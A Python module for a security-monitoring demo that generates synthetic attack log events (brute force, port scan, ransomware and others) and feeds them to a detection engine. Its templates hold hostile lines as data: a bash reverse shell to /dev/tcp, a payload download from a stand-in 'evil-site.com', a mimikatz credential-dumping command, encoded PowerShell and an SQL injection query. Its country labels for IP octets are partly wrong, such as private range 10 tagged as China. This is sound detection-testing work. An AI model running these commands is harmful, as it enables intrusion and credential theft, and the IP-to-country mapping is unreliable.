import random
import uuid
import logging
import asyncio
from datetime import datetime, timedelta
from typing import List, Optional, Dict
from apscheduler.schedulers.asyncio import AsyncIOScheduler

from backend.database import SessionLocal
from backend.models.log import Log
from backend.models.alert import Alert
from backend.services.log_normalizer import LogNormalizer
from backend.services.detection_engine import DetectionEngine
from backend.services.geo_lookup import get_geo_lookup

logger = logging.getLogger(__name__)


class SyntheticAttackGenerator:
    """Generate realistic synthetic attack events for demo purposes."""
    
    def __init__(self):
        self.scheduler: Optional[AsyncIOScheduler] = None
        self.is_running: bool = False
        self.total_generated: int = 0
        self.started_at: Optional[datetime] = None
        self.interval_min: int = 5
        self.interval_max: int = 30
        self._attack_count: int = 0
        
        # Malicious IP pools (first octets from geo_ranges.json)
        self._malicious_first_octets = [
            5,   # Russia
            10,  # China
            36,  # China
            42,  # China
            77,  # China
            101, # China
            103, # China
            110, # China
            175, # South Korea
            196, # South Africa
            41,  # Nigeria
            14,  # Japan
            202, # Australia
            91,  # Iran
            185, # Iran
            2,   # France
            62,  # Iran
            45,  # Czech
            195, # EU
            213, # EU
        ]
        
        # Attacker usernames
        self._attacker_usernames = [
            'admin', 'root', 'administrator', 'sa', 'oracle', 'postgres', 
            'jenkins', 'git', 'ubuntu', 'ec2-user', 'support', 'helpdesk'
        ]
        
        # Legitimate usernames
        self._legitimate_usernames = [
            'j.smith', 'a.kumar', 'm.chen', 's.patel', 'k.davis', 
            'r.gupta', 'l.wong', 't.johnson', 'n.brown', 'p.wilson'
        ]
        
        # Target IPs
        self._target_ips = [
            '192.168.1.100', '192.168.1.101', '192.168.1.102',
            '192.168.1.50', '10.0.0.50', '10.0.0.51', '10.0.0.52',
            '10.10.10.10', '172.16.0.100'
        ]
        
        # Attack templates with weights
        self._attack_templates = {
            'brute_force': {'weight': 30, 'severity': 3},
            'powershell_encoded': {'weight': 15, 'severity': 4},
            'credential_dumping': {'weight': 8, 'severity': 5},
            'suspicious_download': {'weight': 12, 'severity': 3},
            'port_scan': {'weight': 10, 'severity': 3},
            'sql_injection': {'weight': 8, 'severity': 4},
            'ransomware': {'weight': 7, 'severity': 5},
            'reverse_shell': {'weight': 10, 'severity': 5},
        }
    
    def start(self) -> None:
        """Start the attack generator scheduler."""
        if self.is_running:
            logger.info("Generator already running")
            return
        
        self.scheduler = AsyncIOScheduler()
        self.is_running = True
        self.started_at = datetime.utcnow()
        self.total_generated = 0
        self._schedule_next_attack()
        self.scheduler.start()
        logger.info(f"Synthetic attack generator started (interval: {self.interval_min}-{self.interval_max}s)")
    
    def stop(self) -> None:
        """Stop the attack generator."""
        if not self.is_running:
            return
        
        if self.scheduler:
            self.scheduler.shutdown(wait=False)
            self.scheduler = None
        
        self.is_running = False
        logger.info("Synthetic attack generator stopped")
    
    def _schedule_next_attack(self) -> None:
        """Schedule the next attack."""
        if not self.is_running or not self.scheduler:
            return
        
        interval = random.randint(self.interval_min, self.interval_max)
        
        self.scheduler.add_job(
            self._generate_and_process,
            'date',
            run_date=datetime.utcnow() + timedelta(seconds=interval),
            id='synthetic_attack'
        )
    
    async def _generate_and_process(self) -> None:
        """Generate an attack and process it through the detection engine."""
        try:
            attack_type = self._select_attack_type()
            logger.debug(f"Generating {attack_type} attack")
            
            if attack_type == 'brute_force':
                await self._generate_brute_force_attack()
            else:
                await self._generate_single_attack(attack_type)
            
            self.total_generated += 1
        except Exception as e:
            logger.error(f"Error generating attack: {e}")
        finally:
            if self.is_running:
                self._schedule_next_attack()
    
    def _select_attack_type(self) -> str:
        """Select attack type based on weights."""
        weights = [t['weight'] for t in self._attack_templates.values()]
        return random.choices(
            list(self._attack_templates.keys()),
            weights=weights
        )[0]
    
    def _generate_malicious_ip(self) -> str:
        """Generate a random malicious IP."""
        first = random.choice(self._malicious_first_octets)
        return f"{first}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    async def _generate_brute_force_attack(self) -> None:
        """Generate multiple failed login attempts to trigger brute force detection."""
        source_ip = self._generate_malicious_ip()
        username = random.choice(self._attacker_usernames)
        
        # Generate 5-12 failed attempts spread over 30 seconds
        attempt_count = random.randint(5, 12)
        
        for i in range(attempt_count):
            await asyncio.sleep(random.uniform(0.1, 2.0))
            
            log = self._create_log(
                source_ip=source_ip,
                username=username,
                event_type='LOGIN_FAILED',
                severity=2,
                raw_log=f"sshd[{random.randint(1000,9999)}]: Failed password for {username} from {source_ip} port {random.randint(40000,60000)} ssh2",
                log_source='synthetic'
            )
            
            if log:
                await self._process_log(log)
        
        # Wait a bit then successful login
        await asyncio.sleep(random.uniform(1, 3))
        
        await self._process_log(self._create_log(
            source_ip=source_ip,
            username=username,
            event_type='LOGIN_SUCCESS',
            severity=1,
            raw_log=f"sshd[{random.randint(1000,9999)}]: Accepted password for {username} from {source_ip} port {random.randint(40000,60000)} ssh2",
            log_source='synthetic'
        ))
    
    async def _generate_single_attack(self, attack_type: str) -> None:
        """Generate a single attack based on type."""
        source_ip = self._generate_malicious_ip()
        target_ip = random.choice(self._target_ips)
        username = random.choice(self._attacker_usernames)
        
        templates = {
            'powershell_encoded': (
                'LOGIN_FAILED',
                f"powershell.exe -enc JABjAGwAQQBfAHAAZQBzAHMAIAA9ACAAJABjAGwAQQBfAHAAZQBzAHMAIAA+AA==",
                3
            ),
            'credential_dumping': (
                'PROCESS_CREATED',
                f"Process mimikatz.exe started - sekurlsa::logonpasswords",
                4
            ),
            'suspicious_download': (
                'FILE_DOWNLOAD',
                f"User {username} downloaded suspicious.exe from http://evil-site.com/payload.exe",
                2
            ),
            'port_scan': (
                'PORT_SCAN',
                f"Port scan: TCP probe to ports 80,443,22,3389,445 from {source_ip}",
                1
            ),
            'sql_injection': (
                'SQL_QUERY',
                f"GET /login.php?id=1' UNION SELECT password FROM users-- HTTP/1.1",
                3
            ),
            'ransomware': (
                'FILE_ACCESS',
                f"ransomware detected: .encrypted extension added to files on {target_ip}",
                4
            ),
            'reverse_shell': (
                'PROCESS_CREATED',
                f"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
                4
            ),
        }
        
        event_type, raw_log, severity = templates.get(attack_type, ('UNKNOWN', 'Unknown', 1))
        
        await self._process_log(self._create_log(
            source_ip=source_ip,
            dest_ip=target_ip,
            username=username,
            event_type=event_type,
            severity=severity,
            raw_log=raw_log,
            log_source='synthetic'
        ))
    
    def _create_log(self, **kwargs) -> Optional[Log]:
        """Create a log entry."""
        db = SessionLocal()
        try:
            log = Log(**kwargs)
            db.add(log)
            db.commit()
            db.refresh(log)
            return log
        except Exception as e:
            logger.error(f"Error creating log: {e}")
            db.rollback()
            return None
        finally:
            db.close()
    
    async def _process_log(self, log: Optional[Log]) -> None:
        """Process log through detection engine."""
        if not log:
            return
        
        db = SessionLocal()
        try:
            detection_engine = DetectionEngine(db)
            alerts = detection_engine.analyze_log(log)
            logger.debug(f"Generated {len(alerts)} alerts from log {log.id}")
        except Exception as e:
            logger.error(f"Error processing log: {e}")
        finally:
            db.close()
    
    def generate_burst(self, count: int = 10) -> int:
        """Generate a burst of attacks rapidly."""
        self._attack_count += 1
        burst_id = self._attack_count
        
        import threading
        
        def run_burst_thread():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            try:
                async def run_burst():
                    for i in range(count):
                        try:
                            attack_type = self._select_attack_type()
                            await self._generate_single_attack(attack_type)
                            self.total_generated += 1
                            await asyncio.sleep(0.3)
                        except Exception as e:
                            logger.error(f"Burst attack error: {e}")
                loop.run_until_complete(run_burst())
            finally:
                loop.close()
        
        thread = threading.Thread(target=run_burst_thread, daemon=True)
        thread.start()
        
        return count
    
    def get_status(self) -> Dict:
        """Get generator status."""
        return {
            'is_running': self.is_running,
            'total_generated': self.total_generated,
            'started_at': self.started_at.isoformat() if self.started_at else None,
            'interval_min': self.interval_min,
            'interval_max': self.interval_max,
        }
    
    def update_config(self, interval_min: int = None, interval_max: int = None) -> None:
        """Update configuration."""
        if interval_min is not None:
            self.interval_min = interval_min
        if interval_max is not None:
            self.interval_max = interval_max
        logger.info(f"Updated config: interval {self.interval_min}-{self.interval_max}s")


# Singleton instance
_synthetic_generator: Optional[SyntheticAttackGenerator] = None


def get_synthetic_generator() -> SyntheticAttackGenerator:
    """Get singleton generator instance."""
    global _synthetic_generator
    if _synthetic_generator is None:
        _synthetic_generator = SyntheticAttackGenerator()
    return _synthetic_generator


def start_generator() -> None:
    """Start the generator."""
    get_synthetic_generator().start()


def stop_generator() -> None:
    """Stop the generator."""
    get_synthetic_generator().stop()


def is_running() -> bool:
    """Check if generator is running."""
    return get_synthetic_generator().is_running